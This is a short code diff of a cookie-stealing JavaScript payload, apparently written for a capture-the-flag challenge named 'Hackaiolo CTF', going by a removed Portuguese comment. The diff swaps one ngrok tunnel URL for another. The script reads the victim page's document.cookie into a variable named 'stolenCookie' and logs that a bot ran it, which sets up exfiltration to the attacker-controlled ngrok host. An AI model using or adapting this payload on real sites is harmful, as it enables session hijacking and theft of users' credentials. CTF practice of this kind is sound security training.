@@ -1,6 +1,5 @@
-// Script de Exfiltração de Flag - Hackaiolo CTF
 (function() {
-    const ngrokUrl = 'https://0e31-2804-14d-5cd0-960f-fba6-3517-66cb-84f9.ngrok-free.app';
+    const ngrokUrl = 'https://9364-2804-14d-5cd0-960f-b34a-67be-9929-7cb3.ngrok-free.app';
     const stolenCookie = document.cookie;
 
     console.log('[+] Script externo executado pelo bot! Cookie:', stolenCookie);
